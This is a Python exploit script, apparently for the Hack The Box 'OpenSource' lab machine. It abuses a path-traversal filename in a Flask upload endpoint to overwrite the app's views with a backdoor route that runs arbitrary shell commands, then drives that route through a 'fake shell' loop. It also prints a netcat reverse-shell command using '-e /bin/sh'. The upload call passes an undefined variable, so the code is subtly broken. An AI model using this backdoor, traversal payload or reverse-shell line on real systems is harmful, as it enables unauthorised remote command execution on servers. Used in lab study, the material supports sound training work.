#!/bin/usr/env python3

import requests

backdoor_url = "http://10.10.11.164/pwned?cmd="

def exploit():
	url = "http://10.10.11.164/upcloud"
	backdoor = """import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

# Backdoor route, using 'cmd' GET parameter to execute command. Just like PHP's <?php system($_GET['cmd']) ?>
@app.route('/pwned')
def backdoor():
    return os.system(request.args.get('cmd'))"""

	payload = {
		"name": "file",
		"filename": "..//app/app/views.py"
	}

	header = {
		"Host": "10.10.11.164",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		#"Accept-Encoding": "gzip, deflate",
		#"Content-Type": "multipart/form-data; boundary=---------------------------13045151063324881423466548722",
		#"Content-Length": "224",
		"Origin": "http://10.10.11.164",
		"Connection": "close",
		"Referer": "http://10.10.11.164/upcloud",
		"Upgrade-Insecure-Requests": "1",
	}

	# Writing backdoor route into disk
	try:
		print("[+]Writing a backdoor flask route into current working directory...")
		with open("backdoor.py", "w") as f:
			f.write(backdoor)
	except:
		print("[-]Failed to write backdoor flask route into disk.")

	try:
		print("[+]Sending a POST request to modify the /app/app/views.py in the target machine...")
		requests.post(url, data=payload, headers=header, files=file)
	except:
		print("[-]Failed to send the POST request, or the route already existed.")

if __name__ == "__main__":
	exploit()

	# Fake shell
	print("-" * 50)
	print("""[*]Hit Ctrl+C to exit this fake shell.
[*]If you want a reverse shell to the target machine, type this, setup a netcat listener and replace the YOUR_IP and PORT:
nc <YOUR_IP> <PORT> -e /bin/sh""")
	print("-" * 50)
	while True:
		cmd = input("""┌──(root@FakeShell)-[~/HackTheBox/OpenSource]
└─# """)
		requests.get(backdoor_url + cmd)